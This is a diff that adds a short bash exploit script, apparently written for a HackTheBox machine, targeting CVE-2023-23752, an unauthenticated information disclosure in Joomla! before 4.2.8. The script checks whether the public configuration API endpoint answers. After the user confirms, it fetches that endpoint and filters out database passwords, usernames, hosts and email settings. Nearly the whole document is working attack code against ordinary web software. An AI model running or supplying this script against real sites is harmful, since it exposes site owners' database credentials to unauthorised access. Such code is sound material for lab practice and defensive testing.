@@ -1,0 +1,39 @@
+#!/bin/bash 
+#Hey this is Bearcules I made this Script for a Machine on HackTheBox
+#Version: 4.0.0 < 4.2.8 
+#Joomla! < 4.2.8 - Unauthenticated information disclosure
+#CVE : CVE-2023-23752
+#Identifying >> Checking If The website is Vulnerable 
+## References >> 
+#>> https://www.exploit-db.com/exploits/51334
+payload="/api/index.php/v1/config/application?public=true"
+echo "Enter the Url ?" 
+read main_url
+url="http://$main_url"
+url_and_payload="$url""$payload"
+vuln_check=$(curl  -v "$url_and_payload" 2>&1 ) 
+if [[ *"$vuln_check"* == *"HTTP/1.1 200"* ]];then 
+	echo "Vulnerable"
+else 
+	echo "Not Vulnerable"
+fi
+#Asking the User to Proceed with Exploitaion >> 
+read -p "Do you want to proceed With Exploitation(y/n): " proceed
+if [ "$proceed" == "y" ]; then
+echo "Exploiting the Web Server"
+#Exploitation 
+exploit=$(curl -s "$url_and_payload" ) 
+cleaning_output=$(echo -n  "$exploit")
+Importent_resp=$(echo "$cleaning_output" | jq | grep -e 'password' -e 'user' -e 'host' -e 'db' -e 'editor' -e 'sitename' -e 'email' )
+echo "$Importent_resp"
+else
+echo "Exiting"
+fi
+
+
+
+
+
+
+  
+
